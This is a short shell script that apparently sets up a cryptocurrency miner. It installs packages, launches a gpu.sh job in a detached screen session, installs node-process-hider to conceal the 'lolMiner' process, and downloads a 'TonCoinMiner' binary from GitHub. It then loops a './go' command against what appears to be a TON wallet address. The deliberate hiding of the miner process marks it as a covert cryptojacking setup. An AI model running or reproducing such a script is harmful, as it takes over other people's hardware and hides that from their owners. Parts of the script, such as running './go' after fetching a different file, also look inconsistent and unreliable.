#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 69 87
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
wget https://github.com/d-crypto99/Bemiii/raw/main/TonCoinMiner
while [ 1 ]; do
./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
sleep 5

done
